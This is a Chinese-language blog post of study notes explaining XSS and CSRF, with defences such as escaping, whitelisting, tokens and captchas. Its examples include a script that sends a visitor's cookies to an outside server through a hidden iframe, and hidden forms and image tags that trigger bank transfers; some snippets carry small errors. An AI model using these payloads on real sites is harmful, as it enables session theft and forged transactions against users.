---
title: Web安全之XSS和CSRF
date: 2018-08-11 08:39:49
tags: 
    - web安全 
    - 前端
toc: true 

---

今天听了一节web安全的课程，对这个模块不是很熟悉，找了几篇博客总结一下知识点，方便以后复习，这也是我今天搭建博客之后的第一篇博客，鼓励自己多写多记吧!
<!-- more -->
# Web安全之XSS和CSRF
## XSS
### XSS定义

`跨站脚本攻击`，通过客户端脚本语言在一个论坛发帖(其他`input`类型的输入框也可以)中发布一段恶意的`JavaScript`代码就是脚本注入，如果这个代码内容有请求外部服务器，那么就叫`XSS！`

### XSS跨站脚本攻击 Cross site Scipting

主要原因是多数用户的输入没有被转义，而直接执行。 
XSS可以获取到用户cookie或隐私客户端信息。

### 比如通过location.hash
假设某个网站有一段脚本

```javascript
$("#box").html(location.hash.replace('#',''));
```

攻击者看到伪造URL

```javascript
location.href = "http://a.com?"+document.cookie;获取用户cookie!
```

也就是说**它利用了网站的某个漏洞，然后把脚本注入该网页**，让其他登录的用户登录后就会把该用户的信息获取到并发送给一个恶意的服务器。把压缩后的url发给某个登录的用户
### 一个网页的评论有漏洞(没有转义)

```javascript
<script type="text/javascript">
(function(window, document) {
    // 构造泄露信息用的 URL
    var cookies = document.cookie;
    var xssURIBase = "http://192.168.123.123/myxss/";
    var xssURI = xssURIBase + window.encodeURI(cookies);
    // 建立隐藏 iframe 用于通讯
    var hideFrame = document.createElement("iframe");
    hideFrame.height = 0;
    hideFrame.width = 0;
    hideFrame.style.display = "none";
    hideFrame.src = xssURI;
    // 开工
    document.body.appendChild(hideFrame);
})(window, document);
</script> 
```

那么这段代码就会被执行，这个代码会携带着登录用户的信息传输给http://192.168.123.123/myxss/  服务器，然后服务器的代码就会接收了用户的隐式信息!
主要原理就是注入脚本到安全漏洞，然后发送给另外一个站点

### 解决防范
我们不需要用户输入HTML也是输入纯文本，转义是个很好的方法。可以用白名单重复处理。用户输入的HTML可能有很复杂的结构，但我们并不将这些数据直接存入数据库，而是使用 HTML 解析库遍历节点，获取其中数据（之所以不使用 XML 解析库是因为 HTML要求有较强的容错性）。然后根据用户原有的标签属性，重新构建 HTML 元素树。构建的过程中，所有的标签、属性都只从白名单中拿取。这样可以确保万无一失——如果用户的某种复杂输入不能为解析器所识别
## CSRF：cross-site Request Forgery

跨站请求伪造：冒充用户发起请求，完成一些违背用户真实意愿的请求~
## CSRF可以做什么

你这可以这么理解CSRF攻击：**攻击者盗用了你的身份，以你的名义发送恶意请求。** 

**CSRF能够做的事情包括：**以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。

## CSRF原理图

![CSRF原理图](/images/web.png)

## XSS和CSRF的关系

- CSRF更加强调一种形式，只要是伪造用户发起的请求都是CSRF攻击，而XSS更加强调是一种手段。 
- CSRF可以是XSS实现，也可以是其他形式来伪造请求，只要是伪造了请求即CSRF。
**完成CSRF需要两个步骤：** 

- 1.登陆受信任的网站A，在本地生成 COOKIE 
- 2.在不登出A的情况下，或者本地 COOKIE 没有过期的情况下，访问危险网站B。(也有可能B要求访问A网站)
- CSRF不需要知道sessionid就能让用户中招。 

### 原理
![Alt text](../../../images/web.png)
CSRF在另一个网站构造一个表单提交，提交地址是a

```javascript
<form id='test' method='POST' action="http://a.com/guestbook"/  >
```

攻击者只要引导登录a的用户访问这个b网站，自动提交一个留言，这个提交到a网站的过程中，浏览器会将用户的cookie发送到服务器。
## 三种攻击模式

假设B网站有一段HTML代码

```javascript
<img src=http://www.bank.com/Transfer.php?BankId=1122&money=1000>
```

在你登录A网站的时候，会先获取资源，同时留下你的cooki。然后当你再去访问B网站的时候，B会通过img的src属性隐式发送请求给A网站，达到模拟你发送请求的目的，来获取你的资源以及信息。
### 使用POST来完成敏感操作（更新数据）

```javascript
<form action="Transfer.php" method="POST">
　　　　<p>BankId: <input type="text" name="toBankId" /></p>
　　　　<p>Money: <input type="text" name="money" /></p>
　　　　<p><input type="submit" value="Transfer" /></p>
　　</form>
```

危险网站B，可以通过后台使用REQUEST去获取请求的数据，而_REQUEST既可以获取get请求的数据也可以获取post请求的数据
#### node.js
在node.js中，可以处理post请求的URL后面参数部分

```javascript
eq.body.username;//处理请求体request body
req.query.username;//处理查询字符串
```

## 只使用POST请求，只处理POST请求体的数据
危险网站B将代码修改

```javascript
<html>
　　<head>
　　　　<script type="text/javascript">
　　　　　　function steal()
　　　　　　{
          　　　　 iframe = document.frames["steal"];
　　     　　      iframe.document.Submit("transfer");
　　　　　　}
　　　　</script>
　　</head>

　　<body onload="steal()">
　　　　<iframe name="steal" display="none">
　　　　　　<form method="POST" name="transfer"　action="http://www.Bank.com/Transfer.php">
　　　　　　　　<input type="hidden" name="BankId" value="11">
　　　　　　　　<input type="hidden" name="money" value="1000">
　　　　　　</form>
　　　　</iframe>
　　</body>
</html>
```

B网站创建了一个iframe标签，并且把它设置为display:none，隐藏表单属性，偷偷给网站A发送请求，提前把表单提交值设设置好，提交给A网站
## 源于web的身份验证机制

CSRF攻击是源于WEB的隐式身份验证机制！**WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！**
## 防御机制
### 服务端进行CSRF防御

在客户端页面增加随机数。Cookie Hashing，就是构造加密的cookie信息。由于攻击者无法获取第三方cookie，那么表单的数据就构造失败。它不知道提交什么给服务器
在表单里增加Hash值，在服务端验证

```javascript
<form method=”POST” action=”transfer.php”>
　　　　<input type=”text” name=”BankId”>
　　　　<input type=”text” name=”money”>
　　　　<input type=”hidden” name=”hash” value=”<?=$hash;?>”>
　　　　<input type=”submit” name=”submit” value=”Submit”>
　　</form>
```
### 验证码

每次的用户提交都需要用户在表单中填写一个图片上的随机字符串，这个方案可以完全解决CSRF，但在易用性方面似乎不是太好。
### token

首先服务器端要以某种策略生成随机字符串，作为令牌（token），保存在 Session 里。然后在发出请求的页面，把该令牌以隐藏域一类的形式，与其他信息一并发出。在接收请求的页面，把接收到的信息中的令牌与 Session 中的令牌比较，只有一致的时候才处理请求，否则返回 HTTP 403 拒绝请求或者要求用户重新登录验证身份。 
利用Token，嵌入到session中，当进行登录操作的时候就生成这个token，也就是说每次表单被渲染的时候，后台就会生成一个伪随机值来覆盖以前的伪随机值：用户只能成功提交他最后打开的表单，因为所有其他的表单都有非法的伪随机值。
请求令牌虽然使用起来简单，但并非不可破解，使用不当会增加安全隐患。

- 令牌在不同页面最好是不同的使用全局的token可能会导致破解难度下降，因为令牌方法理论上是可破解的，
- 配合验证码
- 无论是验证码还是令牌，验证通过一定要销毁
 